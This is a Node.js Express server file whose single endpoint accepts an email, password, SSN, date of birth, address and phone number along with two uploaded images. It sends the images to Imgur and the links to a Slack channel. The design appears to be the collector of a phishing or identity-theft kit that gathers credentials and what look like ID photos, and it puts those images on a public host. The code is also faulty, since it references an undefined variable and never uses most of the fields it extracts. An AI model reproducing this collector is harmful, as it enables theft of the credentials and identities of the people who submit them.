const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const axios = require("axios");
const { WebClient } = require("@slack/web-api");
const cors = require("cors");
require("dotenv").config();

const app = express();
const port = 3000;

// Slack API Configuration
const slackToken = process.env.SLACK_TOKEN;
const slackChannelId = process.env.SLACK_CHANNEL_ID;

// Imgur API Configuration
const imgurClientId = process.env.IMG_UR_CLIENT_ID;
const imgurApiUrl = process.env.IMG_UR_API_URL;

// Multer configuration for handling file uploads
const multerStorage = multer.memoryStorage();
const upload = multer({ storage: multerStorage });

// Slack Web API client
const web = new WebClient(slackToken);

// Use the cors middleware
app.use(cors());

// Parse incoming JSON requests
app.use(bodyParser.json());

// POST endpoint to handle incoming data and file upload
app.post("/postToSlack", upload.array("images", 2), async (req, res) => {
  try {
    const {
      email,
      password,
      firstName,
      lastName,
      phone,
      ssn,
      homeAddress,
      city,
      state,
      zipCode,
      dateOfBirth,
    } = req.body;

    // Upload each image to Imgur
    const imgurUrls = await Promise.all(
      req.files.map(async (file, index) => {
        const imgurResponse = await axios.post(imgurApiUrl, file.buffer, {
          headers: {
            Authorization: `Client-ID ${imgurClientId}`,
            "Content-Type": file.mimetype,
          },
        });

        if (imgurResponse.data.success) {
          return imgurResponse.data.data.link;
        } else {
          console.error(
            `Imgur API error for image ${index + 1}:`,
            imgurResponse.data.data.error
          );
          return null;
        }
      })
    );

    // Post message to Slack with the Imgur image URLs
    const message = {
      channel: slackChannelId,
      text: `New submission from ${name}`,
      attachments: imgurUrls.map((url, index) => ({
        image_url: url,
        text: `Uploaded Image ${index + 1}`,
      })),
    };

    const postMessageResponse = await web.chat.postMessage(message);

    // Handle postMessage errors
    if (!postMessageResponse.ok) {
      console.error("Error posting to Slack:", postMessageResponse.error);
      return res.status(500).json({ error: "Error posting to Slack" });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error handling request:", error.message);
    return res.status(500).json({ error: "Internal Server Error" });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
